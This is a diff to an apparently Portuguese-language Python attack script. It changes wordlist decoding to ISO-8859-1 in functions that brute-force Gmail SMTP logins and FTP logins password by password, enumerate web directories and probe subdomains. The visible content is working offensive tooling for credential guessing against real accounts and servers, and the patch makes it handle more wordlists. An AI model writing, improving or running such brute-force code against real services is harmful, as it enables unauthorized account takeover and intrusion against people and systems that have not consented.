@@ -12,7 +12,7 @@ def gmail(email, wordlist):
     arq = open(wordlist, "rb")
     for linha in arq.readlines():
         try:
-            senha = linha.strip().decode()
+            senha = linha.strip().decode('ISO-8859-1')
             print('Testando o login com a senha:', senha)
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
@@ -41,7 +41,7 @@ def gmail(email, wordlist):
 def ftp(wordlist, user, alvo):
     arq = open(wordlist, 'rb')
     for senha in arq.readlines():
-        senha = senha.decode()
+        senha = senha.decode('ISO-8859-1')
         try:
             c = ftplib.FTP(alvo)
             c.login(user, senha)
@@ -58,7 +58,7 @@ def diretorio(site, arq):
     wordlist = open(arq, 'rb')
     listapalavra = []
     for linha in wordlist.readlines():
-        listapalavra.append(linha.strip().decode())
+        listapalavra.append(linha.strip().decode('ISO-8859-1'))
     lista = []
     listatemp = []
     ip = site.split('/')
@@ -105,7 +105,7 @@ def subdominio(ip, dominio, arq):
     print('\033[1mWordlist:\033[0;0m', arq)
     print('\033[32m+\033[0;1m--------------------------\033[32m+\033[0;0m')
     for subdominio in wordlist.readlines():
-        subdom = subdominio.strip().decode()
+        subdom = subdominio.strip().decode('ISO-8859-1')
         try:
             req = requests.get('http://'+subdom+'.'+dominio)
             if req.status_code == 200:
